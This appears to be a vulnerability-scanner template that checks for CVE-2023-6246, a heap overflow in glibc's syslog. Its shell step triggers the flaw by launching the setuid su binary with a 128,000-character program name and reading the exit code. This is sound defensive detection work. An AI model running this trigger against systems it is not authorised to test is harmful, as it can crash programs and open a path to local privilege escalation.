code:
- engine:
  - sh
  - bash
  matchers:
  - type: word
    words:
    - '127'
  source: '(exec -a "`printf ''%0128000x'' 1`" /usr/bin/su < /dev/null)

    echo $?

    '
id: CVE-2023-6246
info:
  author: gy741
  classification:
    cpe: cpe:2.3:a:gnu:glibc:*:*:*:*:*:*:*:*
    cve-id: CVE-2023-6246
    cvss-metrics: CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 7.8
    cwe-id: CWE-787,CWE-122
    epss-percentile: 0.96409
    epss-score: 0.29143
  description: 'A heap-based buffer overflow was found in the __vsyslog_internal function
    of the glibc library. This function is called by the syslog and vsyslog functions.
    This issue occurs when the openlog function was not called, or called with the
    ident argument set to NULL, and the program name (the basename of argv[0]) is
    bigger than 1024 bytes, resulting in an application crash or local privilege escalation.
    This issue affects glibc 2.36 and newer.

    '
  impact: 'Local attackers can cause application crashes or escalate privileges through
    buffer overflow exploitation.

    '
  metadata:
    max-request: 1
    product: glibc
    vendor: gnu
  name: glibc's syslog - Local Privilege Escalation
  reference:
  - https://nvd.nist.gov/vuln/detail/CVE-2023-6246
  - https://www.qualys.com/2024/01/30/cve-2023-6246/syslog.txt
  - https://access.redhat.com/security/cve/CVE-2023-6246
  - https://bugzilla.redhat.com/show_bug.cgi?id=2249053
  - https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/D2FIH77VHY3KCRROCXOT6L27WMZXSJ2G/
  remediation: 'Upgrade glibc to version 2.37 or later that properly handles program
    name buffer sizes in __vsyslog_internal.

    '
  severity: high
  tags: cve,cve2023,code,glibc,linux,privesc,local,gnu,vuln
self-contained: true
